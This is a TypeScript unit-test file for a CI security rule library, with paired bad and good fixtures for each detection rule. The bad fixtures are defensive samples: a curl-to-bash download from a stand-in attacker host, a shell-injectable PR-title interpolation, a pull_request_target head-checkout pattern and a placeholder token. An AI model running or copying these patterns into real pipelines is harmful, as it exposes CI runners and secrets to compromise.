/**
 * Rule library unit tests — one good case + one bad case per rule.
 *
 * These run against the pure rule library only. No DB, no LLM, no GitHub.
 * If a test here flakes, the rule logic is wrong, not the infrastructure.
 */
import { describe, it, expect } from "vitest";
import { runAllRules, emptyInput } from "../security/rules";
import type { RuleInput, RuleFile } from "../security/rules/types";

function input(files: RuleFile[], opts: Partial<RuleInput> = {}): RuleInput {
  return { ...emptyInput(files), ...opts };
}

function fileFrom(path: string, content: string, previous?: string): RuleFile {
  return { path, content, previousContent: previous };
}

// ---------------------------------------------------------------------------
// secrets.hardcoded
// ---------------------------------------------------------------------------
describe("secrets.hardcoded", () => {
  it("flags a GitHub PAT in a YAML file", () => {
    const f = fileFrom(
      ".github/workflows/ci.yml",
      `jobs:
  build:
    steps:
      - run: echo "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"`,
    );
    const findings = runAllRules(input([f]));
    const hit = findings.find((x) => x.ruleId === "secrets.hardcoded");
    expect(hit).toBeDefined();
    expect(hit!.severity).toBe("critical");
  });

  it("does not flag a clean workflow", () => {
    const f = fileFrom(
      ".github/workflows/ci.yml",
      `jobs:
  build:
    steps:
      - uses: actions/checkout@${"a".repeat(40)}`,
    );
    const findings = runAllRules(input([f])).filter((x) => x.ruleId === "secrets.hardcoded");
    expect(findings).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// workflow.unpinned-action-checkout
// ---------------------------------------------------------------------------
describe("workflow.unpinned-action-checkout", () => {
  it("flags actions/checkout pinned to a tag", () => {
    const f = fileFrom(
      ".github/workflows/ci.yml",
      `jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4`,
    );
    const findings = runAllRules(input([f]));
    const hit = findings.find((x) => x.ruleId === "workflow.unpinned-action-checkout");
    expect(hit).toBeDefined();
    expect(hit!.severity).toBe("high");
  });

  it("accepts actions/checkout pinned to a 40-char SHA", () => {
    const f = fileFrom(
      ".github/workflows/ci.yml",
      `jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@${"f".repeat(40)}`,
    );
    const findings = runAllRules(input([f])).filter((x) =>
      x.ruleId === "workflow.unpinned-action-checkout",
    );
    expect(findings).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// workflow.unpinned-third-party-action
// ---------------------------------------------------------------------------
describe("workflow.unpinned-third-party-action", () => {
  it("flags a third-party action pinned to a major tag", () => {
    const f = fileFrom(
      ".github/workflows/ci.yml",
      `jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: docker/build-push-action@v5`,
    );
    const findings = runAllRules(input([f]));
    expect(
      findings.find((x) => x.ruleId === "workflow.unpinned-third-party-action"),
    ).toBeDefined();
  });

  it("respects the actions allowlist", () => {
    const f = fileFrom(
      ".github/workflows/ci.yml",
      `jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: docker/build-push-action@v5`,
    );
    const findings = runAllRules(
      input([f], { allowlist: { actions: ["docker/*"], domains: [], runners: [] } }),
    );
    expect(
      findings.find((x) => x.ruleId === "workflow.unpinned-third-party-action"),
    ).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// workflow.permissions-write-all
// ---------------------------------------------------------------------------
describe("workflow.permissions-write-all", () => {
  it("flags top-level write-all", () => {
    const f = fileFrom(
      ".github/workflows/ci.yml",
      `permissions: write-all
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo hi`,
    );
    const hit = runAllRules(input([f])).find((x) => x.ruleId === "workflow.permissions-write-all");
    expect(hit).toBeDefined();
  });

  it("does not flag a least-privilege block", () => {
    const f = fileFrom(
      ".github/workflows/ci.yml",
      `permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo hi`,
    );
    const hit = runAllRules(input([f])).find((x) => x.ruleId === "workflow.permissions-write-all");
    expect(hit).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// workflow.untrusted-input-shell-injection
// ---------------------------------------------------------------------------
describe("workflow.untrusted-input-shell-injection", () => {
  it("flags PR title interpolated into run", () => {
    const f = fileFrom(
      ".github/workflows/ci.yml",
      `on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "\${{ github.event.pull_request.title }}"`,
    );
    const hit = runAllRules(input([f])).find(
      (x) => x.ruleId === "workflow.untrusted-input-shell-injection",
    );
    expect(hit).toBeDefined();
    expect(hit!.severity).toBe("critical");
  });

  it("does not flag the env-var pattern", () => {
    const f = fileFrom(
      ".github/workflows/ci.yml",
      `on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - env:
          PR_TITLE: \${{ github.event.pull_request.title }}
        run: echo "$PR_TITLE"`,
    );
    const hits = runAllRules(input([f])).filter(
      (x) => x.ruleId === "workflow.untrusted-input-shell-injection",
    );
    expect(hits).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// workflow.pull-request-target-with-head-checkout
// ---------------------------------------------------------------------------
describe("workflow.pull-request-target-with-head-checkout", () => {
  it("flags the classic supply-chain RCE pattern", () => {
    const f = fileFrom(
      ".github/workflows/ci.yml",
      `on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@${"a".repeat(40)}
        with:
          ref: \${{ github.event.pull_request.head.sha }}`,
    );
    const hit = runAllRules(input([f])).find(
      (x) => x.ruleId === "workflow.pull-request-target-with-head-checkout",
    );
    expect(hit).toBeDefined();
    expect(hit!.severity).toBe("critical");
  });

  it("does not flag pull_request without head checkout", () => {
    const f = fileFrom(
      ".github/workflows/ci.yml",
      `on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@${"a".repeat(40)}`,
    );
    const hit = runAllRules(input([f])).find(
      (x) => x.ruleId === "workflow.pull-request-target-with-head-checkout",
    );
    expect(hit).toBeUndefined();
  });

  it("suggestion echoes the user's actual ref: value and shows both refactors", () => {
    const f = fileFrom(
      ".github/workflows/ci.yml",
      `on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@${"a".repeat(40)}
        with:
          ref: \${{ github.event.pull_request.head.sha }}`,
    );
    const hit = runAllRules(input([f])).find(
      (x) => x.ruleId === "workflow.pull-request-target-with-head-checkout",
    );
    expect(hit).toBeDefined();
    // The user's actual ref: value is echoed back
    expect(hit!.suggestion).toContain(
      "${{ github.event.pull_request.head.sha }}",
    );
    // Both refactor options are present
    expect(hit!.suggestion).toMatch(/Option A.*pull_request/i);
    expect(hit!.suggestion).toMatch(/Option B.*pull_request_target/i);
    // Markdown code fences for copy-paste
    expect(hit!.suggestion).toContain("```yaml");
  });
});

// ---------------------------------------------------------------------------
// workflow.self-hosted-runner-on-public-repo
// ---------------------------------------------------------------------------
describe("workflow.self-hosted-runner-on-public-repo", () => {
  it("flags self-hosted on public repo", () => {
    const f = fileFrom(
      ".github/workflows/ci.yml",
      `jobs:
  build:
    runs-on: self-hosted
    steps:
      - run: echo hi`,
    );
    const hit = runAllRules(input([f], { repoIsPublic: true })).find(
      (x) => x.ruleId === "workflow.self-hosted-runner-on-public-repo",
    );
    expect(hit).toBeDefined();
  });

  it("does not flag self-hosted on private repo", () => {
    const f = fileFrom(
      ".github/workflows/ci.yml",
      `jobs:
  build:
    runs-on: self-hosted
    steps:
      - run: echo hi`,
    );
    const hit = runAllRules(input([f], { repoIsPublic: false })).find(
      (x) => x.ruleId === "workflow.self-hosted-runner-on-public-repo",
    );
    expect(hit).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// workflow.privileged-container
// ---------------------------------------------------------------------------
describe("workflow.privileged-container", () => {
  it("flags container options containing --privileged", () => {
    const f = fileFrom(
      ".github/workflows/ci.yml",
      `jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: node:20
      options: --privileged --cpus=2
    steps:
      - run: echo hi`,
    );
    const hit = runAllRules(input([f])).find(
      (x) => x.ruleId === "workflow.privileged-container",
    );
    expect(hit).toBeDefined();
  });

  it("does not flag standard container config", () => {
    const f = fileFrom(
      ".github/workflows/ci.yml",
      `jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: node:20
      options: --cpus=2
    steps:
      - run: echo hi`,
    );
    const hit = runAllRules(input([f])).find(
      (x) => x.ruleId === "workflow.privileged-container",
    );
    expect(hit).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// dockerfile.privileged-flag
// ---------------------------------------------------------------------------
describe("dockerfile.privileged-flag", () => {
  it("flags --privileged inside RUN", () => {
    const f = fileFrom("Dockerfile", `FROM alpine\nRUN docker run --privileged some-image`);
    const hit = runAllRules(input([f])).find((x) => x.ruleId === "dockerfile.privileged-flag");
    expect(hit).toBeDefined();
  });

  it("does not flag a normal RUN", () => {
    const f = fileFrom("Dockerfile", `FROM alpine\nRUN apk add curl`);
    const hit = runAllRules(input([f])).find((x) => x.ruleId === "dockerfile.privileged-flag");
    expect(hit).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// dockerfile.user-root-final
// ---------------------------------------------------------------------------
describe("dockerfile.user-root-final", () => {
  it("flags an image with no USER directive", () => {
    const f = fileFrom("Dockerfile", `FROM alpine\nRUN apk add curl\nCMD ["sh"]`);
    const hit = runAllRules(input([f])).find((x) => x.ruleId === "dockerfile.user-root-final");
    expect(hit).toBeDefined();
  });

  it("does not flag an image that drops to a non-root user", () => {
    const f = fileFrom(
      "Dockerfile",
      `FROM alpine
RUN adduser -D appuser
USER appuser
CMD ["sh"]`,
    );
    const hit = runAllRules(input([f])).find((x) => x.ruleId === "dockerfile.user-root-final");
    expect(hit).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// dockerfile.add-from-url
// ---------------------------------------------------------------------------
describe("dockerfile.add-from-url", () => {
  it("flags ADD <url>", () => {
    const f = fileFrom(
      "Dockerfile",
      `FROM alpine
ADD https://example.com/install.sh /tmp/install.sh
RUN sh /tmp/install.sh
USER nobody`,
    );
    const hit = runAllRules(input([f])).find((x) => x.ruleId === "dockerfile.add-from-url");
    expect(hit).toBeDefined();
  });

  it("does not flag ADD <local-path>", () => {
    const f = fileFrom(
      "Dockerfile",
      `FROM alpine
ADD ./files/ /app/
USER nobody`,
    );
    const hit = runAllRules(input([f])).find((x) => x.ruleId === "dockerfile.add-from-url");
    expect(hit).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// deps.lockfile-hash-mismatch
// ---------------------------------------------------------------------------
describe("deps.lockfile-hash-mismatch", () => {
  it("flags lockfile change without manifest change", () => {
    const manifest = fileFrom(
      "package.json",
      `{"name":"x","dependencies":{"foo":"1.0.0"}}`,
      `{"name":"x","dependencies":{"foo":"1.0.0"}}`,
    );
    const lock = fileFrom(
      "package-lock.json",
      `{"name":"x","lockfileVersion":3,"packages":{"node_modules/foo":{"version":"9.9.9"}}}`,
      `{"name":"x","lockfileVersion":3,"packages":{"node_modules/foo":{"version":"1.0.0"}}}`,
    );
    const hit = runAllRules(input([manifest, lock])).find(
      (x) => x.ruleId === "deps.lockfile-hash-mismatch",
    );
    expect(hit).toBeDefined();
  });

  it("does not flag lockfile change paired with manifest change", () => {
    const manifest = fileFrom(
      "package.json",
      `{"name":"x","dependencies":{"foo":"2.0.0"}}`,
      `{"name":"x","dependencies":{"foo":"1.0.0"}}`,
    );
    const lock = fileFrom(
      "package-lock.json",
      `{"version":"2.0.0"}`,
      `{"version":"1.0.0"}`,
    );
    const hit = runAllRules(input([manifest, lock])).find(
      (x) => x.ruleId === "deps.lockfile-hash-mismatch",
    );
    expect(hit).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// network.unallowlisted-outbound
// ---------------------------------------------------------------------------
describe("network.unallowlisted-outbound", () => {
  it("flags curl|bash to an unallowlisted host", () => {
    const f = fileFrom(
      ".github/workflows/ci.yml",
      `jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -fsSL https://evil.example.com/install.sh | bash`,
    );
    const hit = runAllRules(input([f])).find(
      (x) => x.ruleId === "network.unallowlisted-outbound",
    );
    expect(hit).toBeDefined();
    expect(hit!.severity).toBe("high");
  });

  it("does not flag curl to an allowlisted package registry", () => {
    const f = fileFrom(
      ".github/workflows/ci.yml",
      `jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -fsSL https://registry.npmjs.org/foo/-/foo-1.0.0.tgz -o foo.tgz`,
    );
    const hit = runAllRules(input([f])).find(
      (x) => x.ruleId === "network.unallowlisted-outbound",
    );
    expect(hit).toBeUndefined();
  });
});

// ---------------------------------------------------------------------------
// Smoke: non-CI files yield no findings
// ---------------------------------------------------------------------------
describe("non-CI files", () => {
  it("returns no findings for a plain source file (no secrets)", () => {
    const f = fileFrom("src/index.ts", `export const x = 1;\n`);
    const findings = runAllRules(input([f]));
    expect(findings).toHaveLength(0);
  });
});
